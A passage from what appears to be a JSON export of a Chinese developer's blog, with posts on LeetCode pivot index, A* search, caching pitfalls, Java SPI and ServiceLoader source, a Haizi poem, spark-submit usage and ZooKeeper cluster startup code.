(nums.length == 0) return -1 val len = nums.length val sum = nums.sum for ( i &lt;- 0 until len)&#123; val leftSum = nums.take(i).sum val rightSum = sum - leftSum - nums(i) if (leftSum == rightSum)&#123; return i &#125; &#125; return -1 &#125; 讨论区域其他答案 java 这个也比较容易理解,先求数组所有元素的和 S.最后遍历元素,求出遍历位置之前的所有元素之和 L,在用总元素之和减去 L。最后比较 L 和 S-L 是否相等。 12345678public int pivotIndex(int[] nums) &#123; int total = 0, sum = 0 for (int num : nums) total += num; for (int i = 0; i &lt; nums.length; sum += nums[i++]) if (sum * 2 == total - nums[i]) return i; return -1; &#125; C++ 12345678910111213class Solution &#123;public: int pivotIndex(vector&lt;int&gt;&amp; nums) &#123; int total = 0; for (int num : nums) total += num; int sum = 0; for (int i = 0; i &lt; nums.size(); sum += nums[i++]) if (sum * 2 == total - nums[i]) return i; return -1; &#125;&#125;; java 这个方法既是求左右数组的所有元素之和. 1234567891011121314151617181920public static int pivotIndex(int[] nums) &#123; int pivot = -1; int[] sumOfLeftArr = new int[nums.length]; int sumOfLeft = 0; int sumOfRight = 0; for(int i=1; i&lt;nums.length; i++) &#123; sumOfLeft += nums[i-1]; sumOfLeftArr[i] = sumOfLeft; &#125; for(int i=nums.length-1; i&gt;=0; i--)&#123; if(sumOfLeftArr[i] == sumOfRight) &#123; pivot = i; &#125; sumOfRight += nums[i]; &#125; return pivot; &#125; 参考资料 find-pivot-index","updated":"2020-07-19T00:23:28.025Z","tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://xwolf191.github.io/tags/leetcode/"}]},{"title":"A*搜索算法","date":"2019-04-28T05:50:00.000Z","path":"2019/04/28/数据结构和算法/A star搜索算法/","text":"在计算机科学中，A （发音为“A star”）是一种计算机算法，广泛用于寻路和图遍历，这是在多个点（称为“节点”）之间寻找路径的过程。由于其性能和准确性，它得到广泛使用。然而，在实际的旅行路线系统中，它通常优于可以预处理图形以获得更好性能的算法，尽管其他工作已经发现A 优于其他方法.斯坦福研究所（现为SRI国际）的Peter Hart，Nils Nilsson和Bertram Raphael于1968年首次发布该算法.它可以看作是Edsger Dijkstra 1959年算法的延伸。A *通过使用启发式方法来指导其搜索，从而实现更好的性能。 参考资料 A*_search_algorithm A Formal Basis for the Heuristic Determination of Minimum Cost Paths","updated":"2020-07-19T00:23:28.018Z","tags":[{"name":"A*","slug":"A","permalink":"http://xwolf191.github.io/tags/A/"}]},{"title":"缓存穿透&缓存击穿&缓存雪崩","date":"2019-04-23T01:35:00.000Z","path":"2019/04/23/distributed/缓存穿透&缓存击穿&缓存雪崩/","text":"在分布式系统中,缓存层总是会存在下边的几个问题 缓存穿透 缓存击穿 缓存雪崩 本文来讨论解决这几个问题. 缓存穿透首先在系统中,一般的查询操作流程如下图所示: 缓存穿透是指查询一个不存在的数据,由于缓存中没有该数据无法命中,每次请求都要到存储层去查询,失去了缓存的意义.在大量请求的情况下,可能直接压垮数据存储层. 解决方法 布隆过滤器 布隆过滤器是一种空间效率极高的概率型算法和数据结构,用于判断一个元素是否在集合中.需要将可能查询到的 key 提前放入布隆过滤器中. 缓存查询结果 如果查询的结果为空也存入缓存中,并设置过期时间,比如一分钟. 缓存击穿缓存击穿是指一个 key 访问很频繁,当这个 key 在失效的瞬间,持续的大并发就穿破缓存,直接请求数据库. 解决方法 永不过期 简单粗暴,竟然有这么高的请求访问量,必须永不过期. 锁 引入互斥锁,加锁后从 db 查询数据并载入缓存,最后释放锁.保障同一时刻只有一个请求去查询 db,减小 db 压力. 缓存雪崩缓存雪崩,是指在某一个时刻缓存集中过期失效,造成瞬时 DB 请求量大、压力骤增,引起雪崩. 解决方法可以给缓存设置过期时间时加上一个随机值时间,使得每个 key 的过期时间分布开来,避免缓存集中在同一时刻失效. 参考资料 Bloom filter","updated":"2020-07-19T00:23:27.848Z","tags":[{"name":"分布式","slug":"分布式","permalink":"http://xwolf191.github.io/tags/分布式/"}]},{"title":"生命3.0","date":"2019-04-22T08:22:00.000Z","path":"2019/04/22/读书笔记/生命3.0/","text":"简介在人工智能崛起的当下,你希望看到一个什么样的未来？当超越人类智慧的人工智能出现时,人类将何去何从？你是否希望我们创造出能自我设计的生命 3.0,并把它散播到宇宙各处？人工智能时代,生而为人的意义究竟是什么？在《生命 3.0》中,麻省理工学院物理系终身教授、未来生命研究所创始人迈克斯·泰格马克将带领我们参与这个时代最重要的对话。 《生命 3.0》一书中,作者迈克斯·泰格马克对人类的终极未来进行了全方位的畅想,从我们能活到的近未来穿行至 1 万年乃至 10 亿年及其以后,从可见的智能潜入不可见的意识,重新定义了“生命”“智能”“目标”“意识”,并澄清了常见的对人工智能的误解,将帮你构建起应对人工智能时代动态的全新思维框架,抓住人类与人工智能共生演化的焦点。 麻省理工学院物理系终身教授、未来生命研究所创始人迈克斯·泰格马克,重磅新作.从 14 岁起,作者就开始关注科技对人类未来的影响,人工智能的突飞猛进,更是加剧了他的担忧,所以在其 45 岁,创立了人工智能界鼎鼎大名的非营利性组织“未来生命研究所”,致力于用科技改善人类的未来。如今,他将带领我们参与这个时代最重要的对话。 与人工智能相伴,人类将迎来… 读后感随着大数据、人工智能技术的崛起,在电影中看到的机器人统治地球、机器人想人一样思考、具有感情可能会成为现实。但是人类也要控制人工智能,失控的人工智能可能会统治人类。希望和威胁并存…","updated":"2020-07-19T00:23:28.456Z","tags":[{"name":"读书笔记","slug":"读书笔记","permalink":"http://xwolf191.github.io/tags/读书笔记/"}]},{"title":"java SPI机制","date":"2019-04-17T02:10:00.000Z","path":"2019/04/17/java/java SPI机制/","text":"Java 6 引入了一种功能，用于发现和加载与给定接口匹配的实现：服务提供者接口（SPI）。 概述SPI 是 java 用于发现和加载与给定接口匹配的实现提供的一种实现机制。主要是为了扩展现有系统应用等。在 JDK 中也有大量应用,比如： java.nio.file.spi.FileSystemProvider 实现定义接口和实现 12345678910111213141516171819202122232425262728293031/** * @author xwolf */public interface IEat &#123; void eat();&#125;public class Apple implements IEat &#123; @Override public void eat() &#123; System.out.println(\"eat Apple....\"); &#125;&#125;public class Peach implements IEat &#123; @Override public void eat() &#123; System.out.println(\"eat Peach...\"); &#125;&#125;public class Pear implements IEat &#123; @Override public void eat() &#123; System.out.println(\"eat Pear...\"); &#125;&#125; 接着在项目资源目录创建 spi 指定的文件夹 META-INF/services/,最后创建 spi 的描述文件,指定接口的实现类信息,文件名称必须为接口的全类名。本文创建的文件名称既为 com.xwolf.java.spi.IEat,内容为具体的实现类,可以有多个,按行区分. 12com.xwolf.java.spi.Applecom.xwolf.java.spi.Pear 最后定义调用服务的具体实现: 1234567891011121314import java.util.ServiceLoader;/** * @author xwolf */public class EatProvider &#123; public static void main(String[] args) &#123; ServiceLoader&lt;IEat&gt; eatProvider = ServiceLoader.load(IEat.class); for (IEat eat : eatProvider)&#123; eat.eat(); &#125; &#125;&#125; 运行可以正常调用两个定义的实现。 ServiceLoader 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293public final class ServiceLoader&lt;S&gt; implements Iterable&lt;S&gt;&#123; //目录前缀 private static final String PREFIX = \"META-INF/services/\"; // 加载的接口或者类的信息 private final Class&lt;S&gt; service; //实例化类的类加载器类型 private final ClassLoader loader; // 权限控制context private final AccessControlContext acc; // 提供者信息 private LinkedHashMap&lt;String,S&gt; providers = new LinkedHashMap&lt;&gt;(); // 延迟迭代器 private LazyIterator lookupIterator; /** * 清空provides,初始化延迟迭代器 */ public void reload() &#123; providers.clear(); lookupIterator = new LazyIterator(service, loader); &#125; /** 私有构造器 */ private ServiceLoader(Class&lt;S&gt; svc, ClassLoader cl) &#123; service = Objects.requireNonNull(svc, \"Service interface cannot be null\"); //如果类记载器为空,用系统类加载器 loader = (cl == null) ? ClassLoader.getSystemClassLoader() : cl; //上下文控制 acc = (System.getSecurityManager() != null) ? AccessController.getContext() : null; reload(); &#125; private static void fail(Class&lt;?&gt; service, String msg, Throwable cause) throws ServiceConfigurationError &#123; throw new ServiceConfigurationError(service.getName() + \": \" + msg, cause); &#125; //定义的配置错误信息 private static void fail(Class&lt;?&gt; service, String msg) throws ServiceConfigurationError &#123; throw new ServiceConfigurationError(service.getName() + \": \" + msg); &#125; private static void fail(Class&lt;?&gt; service, URL u, int line, String msg) throws ServiceConfigurationError &#123; fail(service, u + \":\" + line + \": \" + msg); &#125; //读取单行信息 private int parseLine(Class&lt;?&gt; service, URL u, BufferedReader r, int lc, List&lt;String&gt; names) throws IOException, ServiceConfigurationError &#123; String ln = r.readLine(); if (ln == null) &#123; return -1; &#125; //截取#前面的类信息 int ci = ln.indexOf('#'); if (ci &gt;= 0) ln = ln.substring(0, ci); ln = ln.trim(); int n = ln.length(); if (n != 0) &#123; //配置语法错误,不能包含空格或者转义符 if ((ln.indexOf(' ') &gt;= 0) || (ln.indexOf('\\t') &gt;= 0)) fail(service, u, lc, \"Illegal configuration-file syntax\"); int cp = ln.codePointAt(0); if (!Character.isJavaIdentifierStart(cp)) fail(service, u, lc, \"Illegal provider-class name: \" + ln); for (int i = Character.charCount(cp); i &lt; n; i += Character.charCount(cp)) &#123; cp = ln.codePointAt(i); if (!Character.isJavaIdentifierPart(cp) &amp;&amp; (cp != '.')) fail(service, u, lc, \"Illegal provider-class name: \" + ln); &#125; //提供者添加到List中 if (!providers.containsKey(ln) &amp;&amp; !names.contains(ln)) names.add(ln); &#125; //行数+1 return lc + 1; &#125; //从磁盘绝对路径解析配置文件，获取提供者信息 private Iterator&lt;String&gt; parse(Class&lt;?&gt; service, URL u) throws ServiceConfigurationError &#123; InputStream in = null; BufferedReader r = null; ArrayList&lt;String&gt; names = new ArrayList&lt;&gt;(); try &#123; in = u.openStream(); r = new BufferedReader(new InputStreamReader(in, \"utf-8\")); int lc = 1; //读取文件内容 while ((lc = parseLine(service, u, r, lc, names)) &gt;= 0); &#125; catch (IOException x) &#123; fail(service, \"Error reading configuration file\", x); &#125; finally &#123; try &#123; if (r != null) r.close(); if (in != null) in.close(); &#125; catch (IOException y) &#123; fail(service, \"Error closing configuration file\", y); &#125; &#125; return names.iterator(); &#125; //延迟迭代器 private class LazyIterator implements Iterator&lt;S&gt; &#123; Class&lt;S&gt; service; ClassLoader loader; Enumeration&lt;URL&gt; configs = null; Iterator&lt;String&gt; pending = null; String nextName = null; private LazyIterator(Class&lt;S&gt; service, ClassLoader loader) &#123; this.service = service; this.loader = loader; &#125; //是否有services private boolean hasNextService() &#123; if (nextName != null) &#123; return true; &#125; if (configs == null) &#123; try &#123; //配置信息 String fullName = PREFIX + service.getName(); if (loader == null) configs = ClassLoader.getSystemResources(fullName); else configs = loader.getResources(fullName); &#125; catch (IOException x) &#123; fail(service, \"Error locating configuration files\", x); &#125; &#125; while ((pending == null) || !pending.hasNext()) &#123; if (!configs.hasMoreElements()) &#123; return false; &#125; //解析配置文件信息 pending = parse(service, configs.nextElement()); &#125; nextName = pending.next(); return true; &#125; //获取下一下service private S nextService() &#123; if (!hasNextService()) throw new NoSuchElementException(); String cn = nextName; nextName = null; Class&lt;?&gt; c = null; try &#123; c = Class.forName(cn, false, loader); &#125; catch (ClassNotFoundException x) &#123; fail(service, \"Provider \" + cn + \" not found\"); &#125; if (!service.isAssignableFrom(c)) &#123; fail(service, \"Provider \" + cn + \" not a subtype\"); &#125; try &#123; S p = service.cast(c.newInstance()); //提供者信息添加到map中 providers.put(cn, p); return p; &#125; catch (Throwable x) &#123; fail(service, \"Provider \" + cn + \" could not be instantiated\", x); &#125; throw new Error(); // This cannot happen &#125; public boolean hasNext() &#123; if (acc == null) &#123; return hasNextService(); &#125; else &#123; PrivilegedAction&lt;Boolean&gt; action = new PrivilegedAction&lt;Boolean&gt;() &#123; public Boolean run() &#123; return hasNextService(); &#125; &#125;; return AccessController.doPrivileged(action, acc); &#125; &#125; public S next() &#123; if (acc == null) &#123; return nextService(); &#125; else &#123; PrivilegedAction&lt;S&gt; action = new PrivilegedAction&lt;S&gt;() &#123; public S run() &#123; return nextService(); &#125; &#125;; return AccessController.doPrivileged(action, acc); &#125; &#125; public void remove() &#123; throw new UnsupportedOperationException(); &#125; &#125; /** 实际调用的迭代器方法,实际调用延迟迭代器的方法 */ public Iterator&lt;S&gt; iterator() &#123; return new Iterator&lt;S&gt;() &#123; Iterator&lt;Map.Entry&lt;String,S&gt;&gt; knownProviders = providers.entrySet().iterator(); public boolean hasNext() &#123; if (knownProviders.hasNext()) return true; //调用延迟迭代器的方法 return lookupIterator.hasNext(); &#125; public S next() &#123; if (knownProviders.hasNext()) return knownProviders.next().getValue(); return lookupIterator.next(); &#125; public void remove() &#123; throw new UnsupportedOperationException(); &#125; &#125;; &#125; /** 用给定的service和loader返回新的ServiceLoader对象 */ public static &lt;S&gt; ServiceLoader&lt;S&gt; load(Class&lt;S&gt; service, ClassLoader loader) &#123; return new ServiceLoader&lt;&gt;(service, loader); &#125; /** 用给定的class和当前线程的上线文类加载器重新返回新的ServiceLoader */ public static &lt;S&gt; ServiceLoader&lt;S&gt; load(Class&lt;S&gt; service) &#123; ClassLoader cl = Thread.currentThread().getContextClassLoader(); return ServiceLoader.load(service, cl); &#125; /** * 用扩展加载器来加载给定的service */ public static &lt;S&gt; ServiceLoader&lt;S&gt; loadInstalled(Class&lt;S&gt; service) &#123; ClassLoader cl = ClassLoader.getSystemClassLoader(); ClassLoader prev = null; while (cl != null) &#123; prev = cl; cl = cl.getParent(); &#125; return ServiceLoader.load(service, prev); &#125; /** * toString */ public String toString() &#123; return \"java.util.ServiceLoader[\" + service.getName() + \"]\"; &#125;&#125; 源码不多说了,也比较简单。涉及到类加载的问题,要深究的话可以参考下边的资料。 参考资料 Service provider interface 深入浅出 ClassLoader","updated":"2020-07-19T00:23:27.855Z","tags":[{"name":"java","slug":"java","permalink":"http://xwolf191.github.io/tags/java/"}]},{"title":"以梦为马-海子","date":"2019-04-16T11:15:00.000Z","path":"2019/04/16/杂侃/以梦为马-海子/","text":"作者：海 子 我要做远方的忠诚的儿子 和物质的短暂情人 和所有以梦为马的诗人一样 我不得不和烈士和小丑走在同一道路上 万人都要将火熄灭 我一人独将此火高高举起 此火为大 开花落英于神圣的祖国 和所有以梦为马的诗人一样 我藉此火得度一生的茫茫黑夜 此火为大 祖国的语言和乱石投筑的梁山城寨 以梦为上的敦煌——那七月也会寒冷的骨骼 如雪白的柴和坚硬的条条白雪 横放在众神之山 和所有以梦为马的诗人一样 我投入此火 这三者是囚禁我的灯盏 吐出光辉 万人都要从我刀口走过 去建筑祖国的语言 我甘愿一切从头开始 和所有以梦为马的诗人一样 我也愿将牢底坐穿 众神创造物中只有我最易朽 带着不可抗拒的 死亡的速度 只有粮食是我珍爱 我将她紧紧抱住 抱住她 在故乡生儿育女 和所有以梦为马的诗人一样 我也愿将自己埋葬在四周高高的山上 守望平静的家园 面对大河我无限惭愧 我年华虚度 空有一身疲倦 和所有以梦为马的诗人一样 岁月易逝 一滴不剩 水滴中有一匹马儿 一命归天 千年后如若我再生于祖国的河岸 千年后我再次拥有中国的稻田 和周天子的雪山 天马踢踏 和所有以梦为马的诗人一样 我选择永恒的事业 我的事业 就是要成为太阳的一生 他从古至今——“日”——他无比辉煌无比光明 和所有以梦为马的诗人一样 最后我被黄昏的众神抬入不朽的太阳 太阳是我的名字 太阳是我的一生 太阳的山顶埋葬 诗歌的尸体——千年王国和我 骑着五千年凤凰和名字叫”马”的龙——我必将失败 但诗歌本身以太阳必将胜利","updated":"2020-07-19T00:23:28.413Z","tags":[{"name":"杂侃","slug":"杂侃","permalink":"http://xwolf191.github.io/tags/杂侃/"}]},{"title":"spark-submit提交任务","date":"2019-04-15T11:00:00.000Z","path":"2019/04/15/大数据/spark-submit提交任务/","text":"先新建一个 workcount 任务: 123456789101112131415161718package com.xwolf.bigdataimport org.apache.spark.SparkContext/** * spark wordcount. * * @author xwolf */object WordCount &#123; def main(args: Array[String]): Unit = &#123; val sc = new SparkContext().textFile(\"README.md\").flatMap(_.split(\" \")).map(w =&gt; (w,1)).reduceByKey(_+_).collect() sc.foreach(println) &#125;&#125; 打包成 jar,上传至服务器中. spark-sumit 是通过 jar 将任务提交到集群运行.常用的参数如下: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182[root@hadoop01 bigdata]# spark-submitUsage: spark-submit [options] &lt;app jar | python file | R file&gt; [app arguments]Usage: spark-submit --kill [submission ID] --master [spark://...]Usage: spark-submit --status [submission ID] --master [spark://...]Usage: spark-submit run-example [options] example-class [example args]Options: --master MASTER_URL spark://host:port, mesos://host:port, yarn, k8s://https://host:port, or local (Default: local[*]). --deploy-mode DEPLOY_MODE Whether to launch the driver program locally (\"client\") or on one of the worker machines inside the cluster (\"cluster\") (Default: client). --class CLASS_NAME Your application's main class (for Java / Scala apps). --name NAME A name of your application. --jars JARS Comma-separated list of jars to include on the driver and executor classpaths. --packages Comma-separated list of maven coordinates of jars to include on the driver and executor classpaths. Will search the local maven repo, then maven central and any additional remote repositories given by --repositories. The format for the coordinates should be groupId:artifactId:version. --exclude-packages Comma-separated list of groupId:artifactId, to exclude while resolving the dependencies provided in --packages to avoid dependency conflicts. --repositories Comma-separated list of additional remote repositories to search for the maven coordinates given with --packages. --py-files PY_FILES Comma-separated list of .zip, .egg, or .py files to place on the PYTHONPATH for Python apps. --files FILES Comma-separated list of files to be placed in the working directory of each executor. File paths of these files in executors can be accessed via SparkFiles.get(fileName). --conf PROP=VALUE Arbitrary Spark configuration property. --properties-file FILE Path to a file from which to load extra properties. If not specified, this will look for conf/spark-defaults.conf. --driver-memory MEM Memory for driver (e.g. 1000M, 2G) (Default: 1024M). --driver-java-options Extra Java options to pass to the driver. --driver-library-path Extra library path entries to pass to the driver. --driver-class-path Extra class path entries to pass to the driver. Note that jars added with --jars are automatically included in the classpath. --executor-memory MEM Memory per executor (e.g. 1000M, 2G) (Default: 1G). --proxy-user NAME User to impersonate when submitting the application. This argument does not work with --principal / --keytab. --help, -h Show this help message and exit. --verbose, -v Print additional debug output. --version, Print the version of current Spark. Cluster deploy mode only: --driver-cores NUM Number of cores used by the driver, only in cluster mode (Default: 1). Spark standalone or Mesos with cluster deploy mode only: --supervise If given, restarts the driver on failure. --kill SUBMISSION_ID If given, kills the driver specified. --status SUBMISSION_ID If given, requests the status of the driver specified. Spark standalone and Mesos only: --total-executor-cores NUM Total cores for all executors. Spark standalone and YARN only: --executor-cores NUM Number of cores per executor. (Default: 1 in YARN mode, or all available cores on the worker in standalone mode) YARN-only: --queue QUEUE_NAME The YARN queue to submit to (Default: \"default\"). --num-executors NUM Number of executors to launch (Default: 2). If dynamic allocation is enabled, the initial number of executors will be at least NUM. --archives ARCHIVES Comma separated list of archives to be extracted into the working directory of each executor. --principal PRINCIPAL Principal to be used to login to KDC, while running on secure HDFS. --keytab KEYTAB The full path to the file that contains the keytab for the principal specified above. This keytab will be copied to the node running the Application Master via the Secure Distributed Cache, for renewing the login tickets and the delegation tokens periodically. 每一个选项都写的很清楚了,这里不做解释了. 提交任务,将输出信息保存到磁盘中。 1spark-submit --master spark://hadoop01:7077 --class com.xwolf.bigdata.WordCount --name wordCount /opt/bigdata/slibs/spark-1.0-SNAPSHOT.jar &gt; /opt/wordcount_result.txt 抛出下边的异常信息: 12345678910111213141516171819202122Exception in thread \"main\" java.lang.BootstrapMethodError: java.lang.NoClassDefFoundError: sc ala/runtime/java8/JFunction2$mcIII$sp at com.xwolf.bigdata.WordCount$.main(WordCount.scala:15) at com.xwolf.bigdata.WordCount.main(WordCount.scala) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java: 43) at java.lang.reflect.Method.invoke(Method.java:498) at org.apache.spark.deploy.JavaMainApplication.start(SparkApplication.scala:52) at org.apache.spark.deploy.SparkSubmit.org$apache$spark$deploy$SparkSubmit$$runMain(S parkSubmit.scala:849) at org.apache.spark.deploy.SparkSubmit.doRunMain$1(SparkSubmit.scala:167) at org.apache.spark.deploy.SparkSubmit.submit(SparkSubmit.scala:195) at org.apache.spark.deploy.SparkSubmit.doSubmit(SparkSubmit.scala:86) at org.apache.spark.deploy.SparkSubmit$$anon$2.doSubmit(SparkSubmit.scala:924) at org.apache.spark.deploy.SparkSubmit$.main(SparkSubmit.scala:933) at org.apache.spark.deploy.SparkSubmit.main(SparkSubmit.scala)Caused by: java.lang.NoClassDefFoundError: scala/runtime/java8/JFunction2$mcIII$sp ... 14 moreCaused by: java.lang.ClassNotFoundException: scala.runtime.java8.JFunction2$mcIII$sp at java.net.URLClassLoader.findClass(URLClassLoader.java:382) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) ... 14 more spark 依赖的 scala 版本为 2.11.12,安装的 scala 的 2.12,本机打包的 scala 环境也是 2.12。 1234[root@hadoop01 jars]# ll -ah scala-scala-compiler-2.11.12.jar scala-reflect-2.11.12.jarscala-library-2.11.12.jar scala-xml_2.11-1.0.5.jarscala-parser-combinators_2.11-1.1.0.jar 先统一 scala 版本，都修改为 2.11.12 版本。重新打包上传后可正常运行。 12345678910111213141516171819202122232425262728293031323334353637# 提交job[root@hadoop01 slibs]# spark-submit --master yarn --class com.xwolf.bigdata.WordCount --name wordCount /opt/bigdata/slibs/spark-1.0-SNAPSHOT.jar &amp;&gt; /opt/wordcount_result.txt# 查看输出内容[root@hadoop01 slibs]# cat /opt/wordcount_result.txt2019-04-15 18:53:59 WARN NativeCodeLoader:62 - Unable to load native-hadoop library for your platform... using builtin-java classes where applicable2019-04-15 18:54:00 INFO SparkContext:54 - Running Spark version 2.4.02019-04-15 18:54:00 INFO SparkContext:54 - Submitted application: wordCount2019-04-15 18:54:00 INFO SecurityManager:54 - Changing view acls to: root2019-04-15 18:54:00 INFO SecurityManager:54 - Changing modify acls to: root2019-04-15 18:54:00 INFO SecurityManager:54 - Changing view acls groups to:2019-04-15 18:54:00 INFO SecurityManager:54 - Changing modify acls groups to:2019-04-15 18:54:00 INFO SecurityManager:54 - SecurityManager: authentication disabled; ui acls disabled; users with view permissions: Set(root); groups with view permissions: Set(); users with modify permissions: Set(root); groups with modify permissions: Set()2019-04-15 18:55:35 INFO DAGScheduler:54 - Job 0 finished: collect at WordCount.scala:15, took 45.183481 s(package,1)(this,1)(integration,1)(Because,1)(Python,2)(cluster.,1)([run,1)(There,1)(its,1)(YARN,,1)(have,1)(general,3)(pre-built,1)(locally,2)(locally.,1)(changed,1)(sc.parallelize(1,1)(only,1)(page](http://spark.apache.org/documentation.html).,1)(Configuration,1)(This,2)(first,1)(basic,1) 在 spark 管理界面可以看到运行的任务和日志等信息. 参考资料 Apache Spark 官网","updated":"2020-07-19T00:23:27.966Z","tags":[{"name":"spark","slug":"spark","permalink":"http://xwolf191.github.io/tags/spark/"}]},{"title":"zookeeper源码分析三之server集群启动过程","date":"2019-04-14T02:00:00.000Z","path":"2019/04/14/distributed/zookeeper源码分析三之server集群启动过程/","text":"前面大概说了一下单机的启动过程,本文主要来说一下 zookeeper 集群的启动过程。 当配置的 server 大于 0 的时候启用集群方式启动 QuorumPeerMain 的 runFromConfig 方法zookeeper 集群启动的逻辑都在这个方法里边实现，下边咱们一步步向下走. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263public void runFromConfig(QuorumPeerConfig config) throws IOException &#123; try &#123; // 注册log4j JMX ManagedUtil.registerLog4jMBeans(); &#125; catch (JMException e) &#123; LOG.warn(\"Unable to register log4j JMX control\", e); &#125; LOG.info(\"Starting quorum peer\"); try &#123; //创建连接工厂 ServerCnxnFactory cnxnFactory = ServerCnxnFactory.createFactory(); //启动NIO Server cnxnFactory.configure(config.getClientPortAddress(), config.getMaxClientCnxns()); // 创建并初始化QuorumPeer quorumPeer = getQuorumPeer(); //servers quorumPeer.setQuorumPeers(config.getServers()); //设置事务日志文件 quorumPeer.setTxnFactory(new FileTxnSnapLog( new File(config.getDataLogDir()), new File(config.getDataDir()))); // 选举类型 quorumPeer.setElectionType(config.getElectionAlg()); quorumPeer.setMyid(config.getServerId()); quorumPeer.setTickTime(config.getTickTime()); quorumPeer.setInitLimit(config.getInitLimit()); quorumPeer.setSyncLimit(config.getSyncLimit()); quorumPeer.setQuorumListenOnAllIPs(config.getQuorumListenOnAllIPs()); // 设置连接信息 quorumPeer.setCnxnFactory(cnxnFactory); quorumPeer.setQuorumVerifier(config.getQuorumVerifier()); quorumPeer.setClientPortAddress(config.getClientPortAddress()); quorumPeer.setMinSessionTimeout(config.getMinSessionTimeout()); quorumPeer.setMaxSessionTimeout(config.getMaxSessionTimeout()); // 设置内存数据 quorumPeer.setZKDatabase(new ZKDatabase(quorumPeer.getTxnFactory())); // 学习者类型 quorumPeer.setLearnerType(config.getPeerType()); quorumPeer.setSyncEnabled(config.getSyncEnabled()); // sets quorum sasl authentication configurations quorumPeer.setQuorumSaslEnabled(config.quorumEnableSasl); if(quorumPeer.isQuorumSaslAuthEnabled())&#123; quorumPeer.setQuorumServerSaslRequired(config.quorumServerRequireSasl); quorumPeer.setQuorumLearnerSaslRequired(config.quorumLearnerRequireSasl); quorumPeer.setQuorumServicePrincipal(config.quorumServicePrincipal); quorumPeer.setQuorumServerLoginContext(config.quorumServerLoginContext); quorumPeer.setQuorumLearnerLoginContext(config.quorumLearnerLoginContext); &#125; // quorumPeer.setQuorumCnxnThreadsSize(config.quorumCnxnThreadsSize); // 初始化QuorumPeer quorumPeer.initialize(); //启动QuorumPeer quorumPeer.start(); quorumPeer.join(); &#125; catch (InterruptedException e) &#123; // warn, but generally this is ok LOG.warn(\"Quorum Peer interrupted\", e); &#125; &#125; 主要是初始化集群的配置信息,下边主要看 start 方法. QuorumPeer 的 start 方法12345678910public synchronized void start() &#123; //加载db loadDataBase(); //启动server,接收请求 cnxnFactory.start(); //开始leader选举 startLeaderElection(); //启动当前线程 super.start();&#125; 这个同步方法主要是加载 db 到内存,启动 server,接收请求,开始 leader 选取。下边一步一步看主要的逻辑. QuorumPeer 的 loadDataBase 方法加载节点、日志信息到内存中. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364private void loadDataBase() &#123; //创建一个临时的更新文件updatingEpoch File updating = new File(getTxnFactory().getSnapDir(), UPDATING_EPOCH_FILENAME); try &#123; //从磁盘加载日志文件到内存 zkDb.loadDataBase(); // load the epochs 获取最后处理的zxid long lastProcessedZxid = zkDb.getDataTree().lastProcessedZxid; // 根据最后的zxid右移32位生成新的zxid long epochOfZxid = ZxidUtils.getEpochFromZxid(lastProcessedZxid); try &#123; //从日志文件读取当前epoch currentEpoch = readLongFromFile(CURRENT_EPOCH_FILENAME); // 如果新生成的zxid大于当前zxid则设置为当前epoch if (epochOfZxid &gt; currentEpoch &amp;&amp; updating.exists()) &#123; LOG.info(\"&#123;&#125; found. The server was terminated after \" + \"taking a snapshot but before updating current \" + \"epoch. Setting current epoch to &#123;&#125;.\", UPDATING_EPOCH_FILENAME, epochOfZxid); //设置为当前epoch,并写回到updatingEpoch文件中 setCurrentEpoch(epochOfZxid); if (!updating.delete()) &#123; throw new IOException(\"Failed to delete \" + updating.toString()); &#125; &#125; &#125; catch(FileNotFoundException e) &#123; // pick a reasonable epoch number // this should only happen once when moving to a // new code version currentEpoch = epochOfZxid; LOG.info(CURRENT_EPOCH_FILENAME + \" not found! Creating with a reasonable default of &#123;&#125;. This should only happen when you are upgrading your installation\", currentEpoch); writeLongToFile(CURRENT_EPOCH_FILENAME, currentEpoch); &#125; // 如果生成的epoch大于当前epoch则抛出异常 if (epochOfZxid &gt; currentEpoch) &#123; throw new IOException(\"The current epoch, \" + ZxidUtils.zxidToString(currentEpoch) + \", is older than the last zxid, \" + lastProcessedZxid); &#125; try &#123; // 从接受文件中读取待接受的epoch acceptedEpoch = readLongFromFile(ACCEPTED_EPOCH_FILENAME); &#125; catch(FileNotFoundException e) &#123; // pick a reasonable epoch number // this should only happen once when moving to a // new code version acceptedEpoch = epochOfZxid; LOG.info(ACCEPTED_EPOCH_FILENAME + \" not found! Creating with a reasonable default of &#123;&#125;. This should only happen when you are upgrading your installation\", acceptedEpoch); //回写当前epoch到文件中 writeLongToFile(ACCEPTED_EPOCH_FILENAME, acceptedEpoch); &#125; if (acceptedEpoch &lt; currentEpoch) &#123; throw new IOException(\"The accepted epoch, \" + ZxidUtils.zxidToString(acceptedEpoch) + \" is less than the current epoch, \" + ZxidUtils.zxidToString(currentEpoch)); &#125; &#125; catch(IOException ie) &#123; LOG.error(\"Unable to load database on disk\", ie); throw new RuntimeException(\"Unable to run quorum server \", ie); &#125; &#125; 主要是获取最后的 zxid,并生成最新的 zxid 写入到文件中。 NIOServerCnxnFactory 的 start 方法这个方法也是启动当前线程，处理连接请求信息。和单机的一样,这里不详细说了。 QuorumPeer 的 startLeaderElection 的方法leader 选取的核心方法 1234567891011121314151617181920212223242526272829303132333435synchronized public void startLeaderElection() &#123; try &#123; //将myid,当前epoch封装为投票信息 currentVote = new Vote(myid, getLastLoggedZxid(), getCurrentEpoch()); &#125; catch(IOException e) &#123; RuntimeException re = new RuntimeException(e.getMessage()); re.setStackTrace(e.getStackTrace()); throw re; &#125; 